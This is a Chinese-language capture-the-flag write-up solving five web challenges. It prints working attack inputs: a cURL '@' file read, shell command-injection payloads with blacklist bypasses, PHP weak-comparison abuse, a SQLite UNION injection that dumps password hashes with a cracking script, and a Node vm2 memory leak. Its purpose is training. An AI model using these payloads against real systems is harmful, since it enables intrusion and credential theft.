# 攻防世界web高手篇（021-025）

<div class="has-toc have-toc">
</div>

## 0x00 Cat

题目描述：抓住那只猫

输入127.0.0.1或者0.0.0.0有回显，baidu.com等无回显，输入管道符等会被判定为`Invalid URL`<figure class="wp-block-image size-full">

<img loading="lazy" width="622" height="150" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-60.png" alt="" class="wp-image-3682" /> </figure> 

FUZZ测试一下，<a rel="noreferrer noopener" href="https://blog.csdn.net/qq_17204441/article/details/102279118" target="_blank" rel="nofollow" >https://blog.csdn.net/qq_17204441/article/details/102279118</a>，`wfuzz -w 字典 url?参数=FUZZ`，发现`@`没有被过滤<figure class="wp-block-image size-full">

<img loading="lazy" width="1058" height="400" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-111.png" alt="" class="wp-image-3753" /> </figure> 

输入字符编码，不会报错，但是`%80`会出错，因为django后端使用的gbk编码，ASCII码的编码范围0-127，%80相当于128 ，所以推断是由unicode解码失败导致的，将报错的代码复制出来，存为html打开，显示django的报错信息，包括请求方式、api接口等等。<figure class="wp-block-image size-full">

<img loading="lazy" width="1006" height="456" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-115.png" alt="" class="wp-image-3761" /> </figure> 

这里补一个hint，RTFM of PHP CURL===>>read the fuck manul of PHP CURL???，里面提到了PHP CURL的概念，参照<a rel="noreferrer noopener" href="https://jasonhzy.github.io/2016/05/04/php-curl-file/" target="_blank" rel="nofollow" >https://jasonhzy.github.io/2016/05/04/php-curl-file/</a>，可以知道PHP的cURL支持通过在数组数据中，使用“@+文件全路径”的语法附加文件，供cURL读取上传。

django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。<figure class="wp-block-image size-full">

<img loading="lazy" width="775" height="265" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-116.png" alt="" class="wp-image-3762" /> </figure> 

所以构造`@/opt/api/database.sqlite3`就可以利用CURLOPT\_SAFE\_UPLOAD为TRUE，禁用@前缀在 CURLOPT_POSTFIELDS 中发送文件的特性，把数据库文件的内容post给django，但是因为编码问题，报错了，就能够看到数据库里面的内容。为了方便观察，将代码再拷贝成html文件查看。得到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="1373" height="534" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-117.png" alt="" class="wp-image-3764" /> </figure> 

## 0x01 favorite_number

代码如下：

<pre class="wp-block-code"><code> &lt;?php
//php5.5.9
$stuff = $_POST&#91;"stuff"];
$array = &#91;'admin', 'user'];
if($stuff === $array && $stuff&#91;0] != 'admin') {
    $num= $_POST&#91;"num"];
    if (preg_match("/^\d+$/im",$num)){
        if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){
            echo "my favorite num is:";
            system("echo ".$num);
        }else{
            echo 'Bonjour!';
        }
    }
} else {
    highlight_file(__FILE__);
} </code></pre>

首先要求stuff强等于array，首元素还不能为‘admin’，php的版本应该是提示信息，查阅资料发现。可以利用PHP的数组下标的BUG实现整型溢出，<a rel="noreferrer noopener" href="https://segmentfault.com/q/1010000003871264" target="_blank" rel="nofollow" >https://segmentfault.com/q/1010000003871264</a>，<a href="https://bugs.php.net/bug.php?id=69892" target="_blank"  rel="nofollow" >https://bugs.php.net/bug.php?id=69892</a>，所以能够构造。

<pre class="wp-block-code"><code>stuff&#91;4294967296]=admin&stuff&#91;1]=user&num=1
stuff&#91;4294967296]=admin&stuff&#91;]=user&num=2
stuff&#91;-4294967296]=admin&stuff&#91;1]=user&num=3
stuff&#91;4294967296]=admin&stuff&#91;4294967297]=user&num=4

2&lt;sup>32&lt;/sup>=4294967296</code></pre>

确实可以绕过第一个判断。<figure class="wp-block-image size-full">

<img loading="lazy" width="167" height="22" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-123.png" alt="" class="wp-image-3777" /> </figure> 

下面绕过数字的判断，可以使用换行符%0a绕过跨行匹配。注意：不能使用hackbar来执行payload，因为火狐浏览器会自动在换行符%0a前面加上回车符%0d，凑成%0d%0a，使绕过失败。于是构造`num=1%0als /`。发现了flag文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="815" height="453" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-125.png" alt="" class="wp-image-3779" /> </figure> 

接着需要绕过黑名单。这里参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/zhengna/p/13962572.html" target="_blank" rel="nofollow" >https://www.cnblogs.com/zhengna/p/13962572.html</a>，<a href="https://blog.csdn.net/rfrder/article/details/111482200" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://blog.csdn.net/rfrder/article/details/111482200</a>

**方法1 用inode索引节点**

先使用`ls -i /`命令寻找flag的inode号<figure class="wp-block-image size-full">

<img loading="lazy" width="191" height="346" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-126.png" alt="" class="wp-image-3781" /> </figure> 

构造`` num=1%0ahead `find / -inum 23593771` ``，反引号绕过单双引号过滤。<figure class="wp-block-image size-full">

<img loading="lazy" width="896" height="336" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-127.png" alt="" class="wp-image-3782" /> </figure> 

**方法2 **将文件名输出到文件里，然后执行文件。****

构造payload

<pre class="wp-block-code"><code>num=1%0aprintf /fla > /tmp/1;printf g >> /tmp/1;head `head /tmp/1`</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="874" height="350" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-129.png" alt="" class="wp-image-3784" /> </figure> 

**方法3 变量拼接**

构造`num=1%0ax=/fla;y=g;tac $x$y`

**方法4 $*和$@**

<pre class="wp-block-code"><code>$*和$@，$x(x 代表 1-9),${x}(x>=10) :比如ca${21}t a.txt表示cat a.txt 
在没有传入参数的情况下,这些特殊字符默认为空


num=1%0aca$1t /fla$1g
num=1%0aca$@t /fla$@g</code></pre>

## 0x02 lottery

规则如下，输入7个数字，如果有相同的，会获得对应的奖励。<figure class="wp-block-image size-full">

<img loading="lazy" width="1128" height="521" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-131.png" alt="" class="wp-image-3787" /></figure> 

flag也可以购买<figure class="wp-block-image size-full">

<img loading="lazy" width="289" height="426" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-132.png" alt="" class="wp-image-3788" /> </figure> 

扫描发现存在git<figure class="wp-block-image size-full">

<img loading="lazy" width="1050" height="398" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-134.png" alt="" class="wp-image-3790" /> </figure> 

用githack下载下来<figure class="wp-block-image size-full">

<img loading="lazy" width="640" height="613" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-133.png" alt="" class="wp-image-3789" /> </figure> 

审计代码发现在api.php中，存在php弱比较。

<pre class="wp-block-code"><code>	for($i=0; $i&lt;7; $i++){
		if($numbers&#91;$i] == $win_numbers&#91;$i]){
			$same_count++;
		}
	}</code></pre>

参照<a rel="noreferrer noopener" href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="nofollow" >https://www.php.net/manual/zh/types.comparisons.php</a>，可以发现int型与true的比较结果都为true。最后构造`{"action":"buy","numbers":[true,true,true,true,true,true,true]}`，成功得到奖金。<figure class="wp-block-image size-full">

<img loading="lazy" width="542" height="489" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-135.png" alt="" class="wp-image-3791" /> </figure> 

攒到足够的钱，买flag<figure class="wp-block-image size-full">

<img loading="lazy" width="756" height="554" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-136.png" alt="" class="wp-image-3792" /> </figure> 

## 0x03 FlatScience

<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-137.png" alt="" class="wp-image-3794" width="539" height="353" /> </figure> 

上扫描器，扫到了一些好东西。<figure class="wp-block-image size-full">

<img loading="lazy" width="662" height="110" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-138.png" alt="" class="wp-image-3795" /> </figure> 

发现管理员页面，提供了一个默认的账户名admin。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-139.png" alt="" class="wp-image-3796" width="374" height="282" /> </figure> 

查看源码，发现hint，提示我们不要尝试绕过。<figure class="wp-block-image size-full">

<img loading="lazy" width="477" height="236" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-140.png" alt="" class="wp-image-3799" /> </figure> 

在login.php存在hint，猜测有debug的页面。<figure class="wp-block-image size-full">

<img loading="lazy" width="390" height="21" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-141.png" alt="" class="wp-image-3800" /> </figure> 

输入`url/?debug=1`，看到数据库为SQLite3。

```php
<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }
    
    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?> 
```

SQLite数据库只有它本身一个数据库，有一个sqlite_master隐藏表，里面存放我们建表的记录。构造`' union select  name,sql  from sqlite_master--`抓包进行分析。<figure class="wp-block-image size-full">

<img loading="lazy" width="971" height="366" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-145.png" alt="" class="wp-image-3806" /> </figure> 

经过url解密得到信息

<pre class="wp-block-code"><code> CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code></pre>

接着分别查询hint，name，password。结果如下：

```
my fav word in my fav paper?!,my love isâ¦?,the password is password

admin,fritze,hansi

3fab54a50e770d830c0416df817567662a9dc85c,54eae8935c90f467427f05e4ece82cf569f89507,34b0bb7c304949f9ff2fc101eef0f048be10d3bd
```

根据admin的密码MD5值，查到ThinJerboaSalz!，所以密码为 ThinJerboa 。在管理员页面登录得到flag<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-146.png" alt="" class="wp-image-3807" width="385" height="342" /> </figure> 

不过比赛时，应该解不出md5值的。根据hint，他的密码应该和pdf有关，使用网上的脚本，python3爬取多目标网页PDF文件并下载到指定目录：

<pre class="wp-block-code"><code>import requests
import re
import os
import sys

re1 = '&#91;a-fA-F0-9]{32,32}.pdf'
re2 = '&#91;0-9\/]{2,2}index.html'

pdf_list = &#91;]
def get_pdf(url):
    global pdf_list 
    print(url)
    req = requests.get(url).text
    re_1 = re.findall(re1,req)
    for i in re_1:
        pdf_url = url+i
        pdf_list.append(pdf_url)
    re_2 = re.findall(re2,req)
    for j in re_2:
        new_url = url+j&#91;0:2]
        get_pdf(new_url)
    return pdf_list
    # return re_2

pdf_list = get_pdf('http://111.200.241.244:52051/')
print(pdf_list)
for i in pdf_list:
    os.system('wget '+i)</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="963" height="640" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-147.png" alt="" class="wp-image-3808" /> </figure> 

然后识别PDF内容并进行密码对冲，这里有一个坑，/pdfminer/converter.py中的line 49, self.pageno += 1需要修改为self.pageno += str(1)。

```python
from io import StringIO

#python3
from pdfminer.pdfpage import PDFPage
from pdfminer.converter import TextConverter
from pdfminer.converter import PDFPageAggregator
from pdfminer.layout import LTTextBoxHorizontal, LAParams
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter


import sys
import string
import os
import hashlib
import importlib
import random
from urllib.request import urlopen
from urllib.request import Request


def get_pdf():
    return [i for i in os.listdir("./") if i.endswith("pdf")]


def convert_pdf_to_txt(path_to_file):
    rsrcmgr = PDFResourceManager()
    retstr = StringIO()
    codec = 'utf-8'
    laparams = LAParams()
    device = TextConverter(rsrcmgr, retstr, codec, laparams)
    fp = open(path_to_file, 'rb')
    interpreter = PDFPageInterpreter(rsrcmgr, device)
    password = ""
    maxpages = 0
    caching = True
    pagenos=set()
    for page in PDFPage.get_pages(fp, pagenos, maxpages=maxpages, password=password,caching=caching, check_extractable=True):
        interpreter.process_page(page)
    text = retstr.getvalue()

    fp.close()
    device.close()
    retstr.close()
    return text

 

def find_password():
    pdf_path = get_pdf()
    for i in pdf_path:
        print ("Searching word in " + i)
        pdf_text = convert_pdf_to_txt("./"+i).split(" ")
        for word in pdf_text:
            sha1_password = hashlib.sha1(word.encode('utf-8')+'Salz!'.encode('utf-8')).hexdigest()
            if (sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c'):
                print ("Find the password :" + word)
                exit()
            

if __name__ == "__main__":
    find_password()
```

<img loading="lazy" width="442" height="53" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-148.png" alt="" class="wp-image-3810" /> </figure> 

## 0x04 leaking

打开页面，分析代码。

<pre class="wp-block-code"><code>"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {
    VM
} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"flag{" + flag + "}\";")
    if (req.query.data && req.query.data.length &lt;= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function() {
    console.log("listening on port 3000!");
});</code></pre>

完全没有头绪，参考<a href="https://blog.csdn.net/weixin_46676743/article/details/112669105" target="_blank" rel="noreferrer noopener" rel="nofollow" >wp</a>才知道这是道关于node.js沙箱逃逸的题，首先定义变量 flag，然后可以在沙箱里面执行任意的命令。如果我们能够构造请求，使得vm上下文代替我们去读取利用沙箱外的代码和变量的话，那就形成了沙箱逃逸。基本原理参考：<a rel="noreferrer noopener" href="https://juejin.cn/post/6889226643525599240" target="_blank" rel="nofollow" >https://blog.csdn.net/qq_41903941/article/details/109379205</a>。不过这题没用到原型链，直接用Buffer()函数用于读取内存的内容，可以通过这个函数直接去读取全局内存中的内容。在较早一点的node版本中(8.0之前),当 Buffer的构造函数传入数字时,会得到与数字长度一致的一个 Buffer,并且这个Buffer是未清零的。8.0之后的版本可以通过另一个函数Buffer. allocUnsafe(size)来获得未清空的内存。

<pre class="wp-block-code"><code># encoding=utf-8

import requests
import time
url = 'http://your ip:port/?data=Buffer(500)'
response = ''
while 'flag' not in response:
        req = requests.get(url)
        response = req.text
        print(req.status_code)
        time.sleep(0.1)
        if 'flag{' in response:
            print(response)
            break</code></pre>

由于内存的保护机制，并不是每一次都能读取到含有flag内容的代码的，多运行几次脚本就好了。<figure class="wp-block-image size-full">

<img loading="lazy" width="971" height="271" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-149.png" alt="" class="wp-image-3816" /> </figure>
